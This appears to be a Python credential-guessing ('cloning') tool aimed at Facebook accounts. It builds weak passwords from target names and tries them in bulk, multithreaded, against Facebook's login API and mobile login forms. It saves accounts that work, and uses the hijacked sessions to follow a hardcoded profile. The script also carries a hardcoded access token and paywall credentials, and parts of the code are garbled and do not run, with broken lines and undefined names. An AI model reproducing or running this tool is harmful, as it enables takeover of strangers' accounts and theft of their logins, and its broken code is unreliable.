#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#os.system("pkg install espeak")



from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass


#---------------------------------MAIN>MENU---------------------------------#
import os
import os
import sys
import time
import requests
import uuid
os.system('git pull')
#os.system("pkg install espeak")

def o():
    os.system('clear')
    print(logo)
    print("\033[1;92m[\033[1;92m\033[1;34mA\033[1;92m] RANDOM NUMBER GREEN CLONING \x1b[38;5;208m[ONLY OK]")
    CYBER =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if CYBER == 'A':
    	C1()
    if me in ["1", "01","11","A","a"]:
	  # os.system('clear')
        None('\n\x1b[1;31mEXIT\x1b[0;97m')
        



import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

#------------------APK<>CHECKER-------------------#    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        #print(f'\033[1;91m%s[%s!%s] %sNot Found Active Apk%s  '%(N,M,N,M,N))
    #else:
        #print(f'\r[🔥] %s \x1b[1;95m Your Active Apps     :{GREEN}'%(GREEN))
        for i in range(len(game)):
            print(f"\033[\033[1;92m[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;96m%s[%s!%s] %sNot Found Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🔥] %s \x1b[1;95m  Your Expired Apps     :{RED}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
            
            

 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100083131624990', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class cyber:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0000)
            

#-------------------COLOR----------------#
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[38;5;46m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]

gg = random.choice(my_color)
bi = random.choice([P,M,K,B,U,O,N,H])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('')
os.system('clear')
print('\x1b[1;32m             WELCOME TO AR RAHIM NEW PAID TOOLS  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(1)
os.system('xdg-open https://t.me/rahimking2034 ')
import getpass

attemps = 0

while attemps < 12345677901:
    username = input('Enter username: ')
    password = input('Enter password: ')

    if username == 'Rahim' and password == '2034':
        print('You have successfully logged in.')
        break
    else:
        print('\033[1;35mINCORRECT THIS TOOLS IS PAID PLZ CONTACT WHATSAPP; +8801831355810')
        attemps += 1
        continue
os.system('clear')
os.system(')
#-------------------mylover-------------------#
logo= """\033[1;92m

                 _____       _     _
     /\          |  __ \     | |   (_)
    /  \   _ __  | |__) |__ _| |__  _ _ __ ___
   / /\ \ | '__| |  _  // _` | '_ \| | '_ ` _ \
  / ____ \| |    | | \ \ (_| | | | | | | | | | |
 /_/    \_\_|    |_|  \_\__,_|_| |_|_|_| |_| |_|
 

\033[1;91m\033[1;41m\033[1;97m              WELCOME TO AR Rahim TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m AR Rahim 
\033[1;32m[-] ADVICE    :\033[1;32m  Free User get fucking a dog
\033[1;32m[-] GIRLFRIEND  :\033[1;32m No Have Girlfriend 
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS AR Rahim BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
#os.system('espeak -a 300 " WELLCOME   TO THE   AR Rahim COMMAND"')



try:
    print("\033[\033[1;92m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    o()
    print("\033[1;91m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    o()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
    except UnboundLocalError:
        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(O,O,O))
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' Your Process Complete...')
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAdf-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Go Back ")
        bsn_menu()

def bsn_menu():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    print("             [*]. CREATED BY : JIHAD HASAN");time.sleep (0.03)
    print("             [*]. FACEBOOK   : JIHAD HASAN");time.sleep (0.03)
    print("             [*]. GITHUB     : JIHAD HASAN");time.sleep (0.03)   
    print("             [*]. VERSION    : 2.5.6");time.sleep (0.03)
    print("             [*]. TOOL TYPE  : PAID");time.sleep (0.03)
    print("             [*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
    print("   \033[1;97m              Menu")
    print("-----------------=\<------------------")
    print(" [1] File Cloning")
    print(" [0] Exit")
    print("")
    pepek = input(' Select : ')
    if pepek in['1','01']:
        __bsn__().bilo(id)
         

class __bsn__:

    def __init__(self):
        self.id = []

    def bilo(self,id):
        os.system('clear')
        logo()
        print("              file crack menu")
        print(' -------------------------------------------')
        print('')
        self.cnt = input('%s [+] file name :%s '%(P,K))
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            logo()
            print("              Method Menu")
            print('-------------------------------------------')
            print('')
            print(' [+] Method 1')
            print(' [+] Method 2')
            print(' [+] Method 3 (Best)')
            pepek = input(' Select : ')
            self.__pler__()
        else:
            print(' Choose Correct One');self.bilo(id)

    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [jihad] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r [OK-JIHAD] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('jihad-ok.txt' , 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s \033[1;91m[CP-JIHAD] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('jihad-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s \033[1;91m[CP-JIHAD] %s | %s ' % (K,user,pw))
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('jihad-cp.txt' , 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [JIHAD] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [OK-JIHAD] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('jihad-ok.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-JIHAD] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('jihad-cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;91m[CP-JIHAD] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('jihad-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://www.facebook.com/profile.php?id=100083131624990",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        chi = ('3')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('3', '03'):

            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                        else:
                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
       pass

            hasil(ok,cp)
        else:
            print('\n Select Valid One');(self.__pler__())


if __name__ == '__main__':
    reg()
